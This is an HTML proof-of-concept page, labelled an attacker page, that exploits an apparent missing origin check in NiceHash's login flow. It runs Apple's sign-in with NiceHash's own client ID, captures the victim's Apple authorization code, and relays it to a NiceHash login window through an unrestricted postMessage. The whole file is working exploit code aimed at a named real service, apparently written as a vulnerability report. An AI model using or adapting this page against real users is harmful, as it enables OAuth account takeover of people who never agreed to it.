<!DOCTYPE html>
  <html>
  <head>
    <script type="text/javascript"
  src="https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js"></script>
  </head>
  <body>
  <h2>Sign in with Apple (attacker page)</h2>
  <div id="appleid-signin" data-color="black" data-border="true" data-type="sign in"></div>
  <pre id="log"></pre>

  <script>
  let nhWin = null;

  // Init Apple Sign In using NiceHash's own clientId
  AppleID.auth.init({
    clientId: 'com.nicehash.SigninClientID',
    scope: 'email',
    redirectURI: 'https://test.nicehash.com/my/login',
    usePopup: true
  });

  // Listen for Apple's response — delivered HERE because WE opened the popup
  document.addEventListener('AppleIDSignInOnSuccess', (event) => {
    const appleData = event.detail;
    log('[+] Got Apple code: ' + appleData.authorization.code.substring(0, 20) + '...');
    log('[+] Relaying to NiceHash via postMessage...');

    // Open NiceHash login (or reuse existing window)
    nhWin = window.open('https://test.nicehash.com/my/login', 'nhLogin',
      'width=600,height=700');

    setTimeout(() => {
      // Relay to NiceHash — no origin check = accepted
      nhWin.postMessage(JSON.stringify({
        method: 'oauthDone',
        data: appleData  // real Apple code bound to NiceHash's clientId
      }), '*');
      log('[+] postMessage sent — check NiceHash window network tab');
    }, 4000);
  });

  document.addEventListener('AppleIDSignInOnFailure', (event) => {
    log('[-] Apple error: ' + JSON.stringify(event.detail));
  });

  function log(msg) {
    document.getElementById('log').textContent += msg + '\n';
  }
  </script>
  </body>
  </html>
